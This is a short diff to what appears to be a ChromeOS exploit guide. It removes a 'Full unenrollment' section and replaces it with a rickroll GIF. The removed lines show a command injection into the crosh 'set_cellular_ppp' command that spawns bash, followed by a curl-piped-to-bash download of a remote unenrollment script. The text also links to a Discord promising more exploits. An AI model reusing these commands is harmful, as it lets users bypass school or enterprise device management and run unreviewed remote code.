@@ -119,12 +119,6 @@ Thanks to CoolElectronics for finding this amazing trick, trent:gra.im and justi
 
 ### Full unenrollment
 
-**Note: This only works on version 101!**
-
-Run the following commands in crosh:
-```bash
-set_cellular_ppp \';bash;exit;\'
-bash <(curl https://coolelectronics.me/unenroll101.sh)
-```
+<img src="https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif" alt="Rickroll GIFs | Tenor"/>
 
 There are still so many more fun exploits, please [join the discord](https://discord.gg/unblock)
